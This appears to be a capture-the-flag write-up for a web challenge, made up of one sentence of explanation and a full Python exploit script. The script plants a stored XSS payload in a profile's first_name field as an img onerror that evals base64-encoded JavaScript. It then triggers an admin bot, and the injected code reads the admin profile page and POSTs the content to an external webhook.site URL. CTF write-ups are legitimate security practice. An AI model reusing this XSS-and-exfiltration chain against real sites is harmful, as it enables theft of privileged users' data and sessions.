 you need to get xss by creating a profile with "first_name" value set to your payload. using that xss you can fetch /profile/1 (which is admin profile) to get the flag and send it to your weebhook

 Exploit.py
 ```
import base64
import random
import httpx
import re
import string


URL = "http://pinder.securinets.tn/"


class API:
    def __init__(self, url=URL) -> None:
        self.url = url
        self.c = httpx.Client(base_url=URL, timeout=100*1000)

    def register(s, username, password):
        return s.c.post("/register", json={
            "username": username,
            "password": password
        })

    def login(s, username, password):
        return s.c.post("/login", json={
            "username": username,
            "password": password
        })

    def create_profile(s, first_name, last_name, profile_picture_link):
        return s.c.post("/create-profile", json={
            "first_name": first_name,
            "last_name": last_name,
            "profile_picture_link": profile_picture_link
        })

    def report(s, url):
        return s.c.post("/report", json={
            "url": url
        })


class Expoit(API):
    def get_profile_id(s):
        res = s.c.get("/my-profile")
        id = re.findall(r"(?<=>#).*?(?=</p>)", res.text)
        if id:
            return id[0]

payload = """
fetch("/profile/1", {
    method: "GET",
    credentials: 'include',
}).then(async res => {
    fetch("https://webhook.site/0d2413b8-0783-4b96-aa31-a78bbe0fc6bd", {
        mode: 'no-cors',
        method: 'POST',
        body: await res.text()
    })
})
"""
payload = base64.b64encode(payload.encode()).decode()

if __name__ == "__main__":
    creds = "".join(random.choices(string.ascii_letters, k=20))
    print("creds:", creds)
    api = Expoit()
    res = api.register(creds, creds)
    print(res.text)
    res = api.login(creds, creds)
    print(res.text)
    res = api.create_profile(
        first_name=f"<img src='x' onerror='eval(atob(\"{payload}\"))'/>",
        last_name='a',
        profile_picture_link='a'
    )
    print(res.text)
    id = api.get_profile_id()
    print("profile id:", id)
    res = api.report("http://127.0.0.1/profile/"+id)
    print(res.text)
```
